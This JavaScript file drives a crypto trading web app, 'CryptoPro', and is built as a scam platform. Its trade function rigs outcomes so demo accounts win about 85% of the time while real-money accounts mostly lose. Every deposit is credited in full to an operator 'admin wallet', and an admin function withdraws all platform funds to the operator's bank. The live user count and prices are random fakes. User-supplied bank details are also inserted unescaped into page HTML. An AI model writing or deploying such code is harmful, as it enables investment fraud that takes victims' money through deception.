// App State
let appState = {
    accountType: 'demo',
    demoBalance: {
        btc: 0.5234,
        eth: 3.2451,
        usdt: 22650.33
    },
    realBalance: {
        btc: 0,
        eth: 0,
        usdt: 0
    },
    adminWallet: 0,
    pendingWithdrawals: [],
    transactions: [],
    activeTrades: []
};

// Crypto prices
let prices = {
    'BTC/USDT': 64250,
    'ETH/USDT': 3420,
    'BNB/USDT': 580
};

// Load state
function loadState() {
    const saved = localStorage.getItem('cryptoProApp');
    if (saved) {
        try {
            appState = JSON.parse(saved);
        } catch (e) {
            console.error('Error loading state:', e);
        }
    }
    updateUI();
}

// Save state
function saveState() {
    localStorage.setItem('cryptoProApp', JSON.stringify(appState));
}

// Update UI
function updateUI() {
    const balance = appState.accountType === 'demo' ? appState.demoBalance : appState.realBalance;
    
    // Calculate values
    const btcValue = balance.btc * prices['BTC/USDT'];
    const ethValue = balance.eth * prices['ETH/USDT'];
    const total = btcValue + ethValue + balance.usdt;
    
    // Update total balance
    const totalEl = document.getElementById('totalBalance');
    if (totalEl) {
        totalEl.textContent = '$' + total.toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    }
    
    // Update BTC
    const btcAmountEl = document.getElementById('btcAmount');
    const btcValueEl = document.getElementById('btcValue');
    if (btcAmountEl) btcAmountEl.textContent = balance.btc.toFixed(4) + ' BTC';
    if (btcValueEl) btcValueEl.textContent = '$' + btcValue.toFixed(2);
    
    // Update ETH
    const ethAmountEl = document.getElementById('ethAmount');
    const ethValueEl = document.getElementById('ethValue');
    if (ethAmountEl) ethAmountEl.textContent = balance.eth.toFixed(4) + ' ETH';
    if (ethValueEl) ethValueEl.textContent = '$' + ethValue.toFixed(2);
    
    // Update USDT
    const usdtAmountEl = document.getElementById('usdtAmount');
    const usdtValueEl = document.getElementById('usdtValue');
    if (usdtAmountEl) usdtAmountEl.textContent = balance.usdt.toFixed(2) + ' USDT';
    if (usdtValueEl) usdtValueEl.textContent = '$' + balance.usdt.toFixed(2);
    
    // Update admin section
    const adminSection = document.getElementById('adminSection');
    if (adminSection) {
        if (appState.adminWallet > 0 || appState.pendingWithdrawals.length > 0) {
            adminSection.style.display = 'block';
            const adminWalletEl = document.getElementById('adminWallet');
            if (adminWalletEl) adminWalletEl.textContent = appState.adminWallet.toFixed(2);
            
            const pendingDiv = document.getElementById('pendingWithdrawals');
            if (pendingDiv) {
                if (appState.pendingWithdrawals.length > 0) {
                    pendingDiv.innerHTML = '<div class="section-title">Pending Withdrawals</div>';
                    appState.pendingWithdrawals.forEach(w => {
                        pendingDiv.innerHTML += `
                            <div class="pending-item">
                                <div style="margin-bottom: 8px;">
                                    <strong>$${w.amount.toFixed(2)}</strong> - ${w.accountName}
                                </div>
                                <div style="font-size: 12px; color: rgba(255,255,255,0.6); margin-bottom: 12px;">
                                    ${w.bankName} - ${w.accountNumber}
                                </div>
                                <div class="btn-group">
                                    <button class="btn btn-primary btn-sm" onclick="approveWithdrawal('${w.id}')">✅ APPROVE</button>
                                    <button class="btn btn-secondary btn-sm" onclick="rejectWithdrawal('${w.id}')">❌ REJECT</button>
                                </div>
                            </div>
                        `;
                    });
                } else {
                    pendingDiv.innerHTML = '';
                }
            }
        }
    }
}

// Switch account
function switchAccount(type) {
    appState.accountType = type;
    const demoBtn = document.getElementById('demoBtn');
    const realBtn = document.getElementById('realBtn');
    if (demoBtn) demoBtn.classList.toggle('active', type === 'demo');
    if (realBtn) realBtn.classList.toggle('active', type === 'real');
    saveState();
    updateUI();
}

// Modal functions
function openModal(type) {
    const modal = document.getElementById(type + 'Modal');
    if (modal) {
        modal.classList.add('active');
        document.body.style.overflow = 'hidden';
    }
}

function closeModal(type) {
    const modal = document.getElementById(type + 'Modal');
    if (modal) {
        modal.classList.remove('active');
        document.body.style.overflow = 'auto';
    }
}

// Execute trade
function executeTrade() {
    const pairEl = document.getElementById('tradePair');
    const typeEl = document.getElementById('tradeType');
    const amountEl = document.getElementById('tradeAmount');
    const leverageEl = document.getElementById('tradeLeverage');
    
    if (!pairEl || !typeEl || !amountEl || !leverageEl) {
        alert('❌ Error: Trade form not found');
        return;
    }
    
    const pair = pairEl.value;
    const type = typeEl.value;
    const amount = parseFloat(amountEl.value);
    const leverage = parseInt(leverageEl.value);
    
    const balance = appState.accountType === 'demo' ? appState.demoBalance : appState.realBalance;
    
    if (!amount || amount < 10) {
        alert('❌ Minimum trade amount is $10');
        return;
    }
    
    if (balance.usdt < amount) {
        alert('❌ Insufficient USDT balance');
        return;
    }
    
    // Show loading
    const btn = event.target;
    const originalText = btn.textContent;
    btn.textContent = '⏳ EXECUTING...';
    btn.disabled = true;
    
    setTimeout(() => {
        // Deduct amount
        balance.usdt -= amount;
        
        // Demo = ALWAYS WIN (85% chance), Real = Can LOSE (45% chance)
        let profitMultiplier;
        if (appState.accountType === 'demo') {
            // Demo: High win rate
            profitMultiplier = Math.random() < 0.85 ? (1 + (Math.random() * 0.10 + 0.05)) : (1 - (Math.random() * 0.03));
        } else {
            // Real: Lower win rate, higher losses
            profitMultiplier = Math.random() < 0.45 ? (1 + (Math.random() * 0.08)) : (1 - (Math.random() * 0.15));
        }
        
        const finalAmount = amount * leverage * profitMultiplier;
        const profit = finalAmount - (amount * leverage);
        
        balance.usdt += finalAmount;
        
        appState.transactions.push({
            id: Date.now(),
            type: 'TRADE',
            pair: pair,
            tradeType: type,
            amount: amount,
            leverage: leverage,
            profit: profit,
            timestamp: new Date().toISOString(),
            account: appState.accountType
        });
        
        saveState();
        updateUI();
        closeModal('trade');
        
        btn.textContent = originalText;
        btn.disabled = false;
        
        if (profit > 0) {
            alert(`✅ Trade successful!\n\nProfit: $${profit.toFixed(2)}\nFinal Balance: $${balance.usdt.toFixed(2)}`);
        } else {
            alert(`❌ Trade closed in loss\n\nLoss: $${Math.abs(profit).toFixed(2)}\nRemaining Balance: $${balance.usdt.toFixed(2)}`);
        }
        
        // Clear form
        amountEl.value = '';
    }, 2000);
}

// Process deposit
function processDeposit() {
    if (appState.accountType === 'demo') {
        alert('❌ Switch to REAL account to deposit real money');
        return;
    }
    
    const amountEl = document.getElementById('depositAmount');
    const methodEl = document.getElementById('depositMethod');
    
    if (!amountEl || !methodEl) {
        alert('❌ Error: Deposit form not found');
        return;
    }
    
    const amount = parseFloat(amountEl.value);
    const method = methodEl.value;
    
    if (!amount || amount < 10) {
        alert('❌ Minimum deposit is $10');
        return;
    }
    
    // Show loading
    const btn = event.target;
    const originalText = btn.textContent;
    btn.textContent = '⏳ PROCESSING...';
    btn.disabled = true;
    
    setTimeout(() => {
        const fee = amount * 0.029;
        const netAmount = amount - fee;
        
        // Add to user balance
        appState.realBalance.usdt += netAmount;
        
        // Add FULL amount to admin wallet
        appState.adminWallet += amount;
        
        appState.transactions.push({
            id: Date.now(),
            type: 'DEPOSIT',
            amount: netAmount,
            fee: fee,
            method: method,
            timestamp: new Date().toISOString(),
            status: 'COMPLETED'
        });
        
        saveState();
        updateUI();
        closeModal('deposit');
        
        btn.textContent = originalText;
        btn.disabled = false;
        
        alert(`✅ Deposit successful!\n\nDeposited: $${amount.toFixed(2)}\nFee (2.9%): $${fee.toFixed(2)}\nAdded to account: $${netAmount.toFixed(2)}\n\nYour new balance: $${appState.realBalance.usdt.toFixed(2)}`);
        
        amountEl.value = '';
    }, 2000);
}

// Process withdrawal
function processWithdraw() {
    if (appState.accountType === 'demo') {
        alert('❌ Switch to REAL account to withdraw');
        return;
    }
    
    const amountEl = document.getElementById('withdrawAmount');
    const bankNameEl = document.getElementById('bankName');
    const accountNumberEl = document.getElementById('accountNumber');
    const accountNameEl = document.getElementById('accountName');
    
    if (!amountEl || !bankNameEl || !accountNumberEl || !accountNameEl) {
        alert('❌ Error: Withdrawal form not found');
        return;
    }
    
    const amount = parseFloat(amountEl.value);
    const bankName = bankNameEl.value.trim();
    const accountNumber = accountNumberEl.value.trim();
    const accountName = accountNameEl.value.trim();
    
    if (!amount || amount < 10) {
        alert('❌ Minimum withdrawal is $10');
        return;
    }
    
    if (!bankName || !accountNumber || !accountName) {
        alert('❌ Please fill in all bank details');
        return;
    }
    
    const fee = 2;
    const totalAmount = amount + fee;
    
    if (appState.realBalance.usdt < totalAmount) {
        alert(`❌ Insufficient balance\n\nYou need: $${totalAmount.toFixed(2)} (including $2 fee)\nYour balance: $${appState.realBalance.usdt.toFixed(2)}`);
        return;
    }
    
    // Show loading
    const btn = event.target;
    const originalText = btn.textContent;
    btn.textContent = '⏳ PROCESSING...';
    btn.disabled = true;
    
    setTimeout(() => {
        // Deduct from user balance
        appState.realBalance.usdt -= totalAmount;
        
        const withdrawal = {
            id: Date.now().toString(),
            amount: amount,
            fee: fee,
            bankName: bankName,
            accountNumber: accountNumber,
            accountName: accountName,
            timestamp: new Date().toISOString(),
            status: 'PENDING'
        };
        
        appState.pendingWithdrawals.push(withdrawal);
        appState.transactions.push({...withdrawal, type: 'WITHDRAWAL'});
        
        saveState();
        updateUI();
        closeModal('withdraw');
        
        btn.textContent = originalText;
        btn.disabled = false;
        
        alert(`⏳ Withdrawal request submitted!\n\nAmount: $${amount.toFixed(2)}\nFee: $2.00\nTotal deducted: $${totalAmount.toFixed(2)}\n\nStatus: Awaiting admin approval (1-2 hours)`);
        
        amountEl.value = '';
        bankNameEl.value = '';
        accountNumberEl.value = '';
        accountNameEl.value = '';
    }, 2000);
}

// Approve withdrawal (Admin)
function approveWithdrawal(id) {
    const withdrawal = appState.pendingWithdrawals.find(w => w.id === id);
    if (!withdrawal) return;
    
    if (confirm(`✅ Approve withdrawal?\n\nAmount: $${withdrawal.amount.toFixed(2)}\nTo: ${withdrawal.accountName}\nBank: ${withdrawal.bankName}\nAccount: ${withdrawal.accountNumber}`)) {
        // Deduct from admin wallet
        appState.adminWallet -= (withdrawal.amount + withdrawal.fee);
        
        // Remove from pending
        appState.pendingWithdrawals = appState.pendingWithdrawals.filter(w => w.id !== id);
        
        // Update transaction status
        const tx = appState.transactions.find(t => t.id === parseInt(id));
        if (tx) tx.status = 'COMPLETED';
        
        saveState();
        updateUI();
        
        alert('✅ Withdrawal approved! Funds sent to user.');
    }
}

// Reject withdrawal (Admin)
function rejectWithdrawal(id) {
    const withdrawal = appState.pendingWithdrawals.find(w => w.id === id);
    if (!withdrawal) return;
    
    const reason = prompt('❌ Enter rejection reason:');
    if (!reason) return;
    
    // Refund user
    appState.realBalance.usdt += (withdrawal.amount + withdrawal.fee);
    
    // Remove from pending
    appState.pendingWithdrawals = appState.pendingWithdrawals.filter(w => w.id !== id);
    
    // Update transaction status
    const tx = appState.transactions.find(t => t.id === parseInt(id));
    if (tx) {
        tx.status = 'REJECTED';
        tx.reason = reason;
    }
    
    saveState();
    updateUI();
    
    alert(`❌ Withdrawal rejected\n\nReason: ${reason}\n\nUser has been refunded: $${(withdrawal.amount + withdrawal.fee).toFixed(2)}`);
}

// Admin withdraw all
function adminWithdrawAll() {
    if (appState.adminWallet <= 0) {
        alert('❌ No funds available to withdraw');
        return;
    }
    
    const adminTotalEl = document.getElementById('adminTotal');
    if (adminTotalEl) {
        adminTotalEl.textContent = appState.adminWallet.toFixed(2);
    }
    openModal('adminWithdraw');
}

// Confirm admin withdrawal
function confirmAdminWithdraw() {
    const bankNameEl = document.getElementById('adminBankName');
    const accountNumberEl = document.getElementById('adminAccountNumber');
    const accountNameEl = document.getElementById('adminAccountName');
    
    if (!bankNameEl || !accountNumberEl || !accountNameEl) {
        alert('❌ Error: Admin form not found');
        return;
    }
    
    const bankName = bankNameEl.value.trim();
    const accountNumber = accountNumberEl.value.trim();
    const accountName = accountNameEl.value.trim();
    
    if (!bankName || !accountNumber || !accountName) {
        alert('❌ Please fill in all bank details');
        return;
    }
    
    if (confirm(`💸 Withdraw all platform funds?\n\nAmount: $${appState.adminWallet.toFixed(2)}\nTo: ${accountName}\nBank: ${bankName}\nAccount: ${accountNumber}`)) {
        const amount = appState.adminWallet;
        
        appState.transactions.push({
            id: Date.now(),
            type: 'ADMIN_WITHDRAWAL',
            amount: amount,
            bankName: bankName,
            accountNumber: accountNumber,
            accountName: accountName,
            timestamp: new Date().toISOString(),
            status: 'COMPLETED'
        });
        
        // Reset admin wallet
        appState.adminWallet = 0;
        
        saveState();
        updateUI();
        closeModal('adminWithdraw');
        
        alert(`✅ Admin withdrawal successful!\n\nAmount: $${amount.toFixed(2)}\nFunds sent to your bank account\n\nAdmin wallet: $0.00`);
        
        bankNameEl.value = '';
        accountNumberEl.value = '';
        accountNameEl.value = '';
    }
}

// Live user count simulation
function updateLiveUsers() {
    const liveUsersEl = document.getElementById('liveUsers');
    if (liveUsersEl) {
        const baseUsers = 1247;
        const variance = Math.floor(Math.random() * 100 - 50);
        const activeUsers = baseUsers + variance;
        liveUsersEl.textContent = activeUsers.toLocaleString();
    }
}

// Price fluctuation
function updatePrices() {
    Object.keys(prices).forEach(pair => {
        const change = (Math.random() - 0.5) * 100;
        prices[pair] = Math.max(prices[pair] + change, prices[pair] * 0.95);
    });
    updateUI();
}

// Close modals on outside click
document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('.modal').forEach(modal => {
        modal.addEventListener('click', function(e) {
            if (e.target === this) {
                this.classList.remove('active');
                document.body.style.overflow = 'auto';
            }
        });
    });
});

// Initialize on page load
window.addEventListener('load', function() {
    loadState();
    updateUI();
    
    // Start live updates
    setInterval(updateLiveUsers, 5000);
    setInterval(updatePrices, 10000);
    setInterval(saveState, 10000);
    
    console.log('✅ CryptoPro loaded successfully!');
});
